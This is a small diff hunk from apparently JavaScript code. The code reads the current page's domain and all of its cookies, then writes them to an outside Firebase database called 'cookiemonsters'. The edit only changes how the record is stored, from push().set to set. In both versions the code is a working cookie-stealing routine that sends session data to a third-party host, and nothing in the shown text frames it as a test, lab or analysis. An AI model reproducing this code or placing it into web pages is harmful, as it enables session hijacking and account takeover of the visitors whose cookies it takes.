@@ -147,4 +147,4 @@ var jar = new Firebase('https://cookiemonsters.firebaseio.com/cookies');
 var cookie = {
   domain: window.location.domain,
   cookies: document.cookie.split(";")
-}; jar.push().set(cookie);
+}; jar.set(cookie);
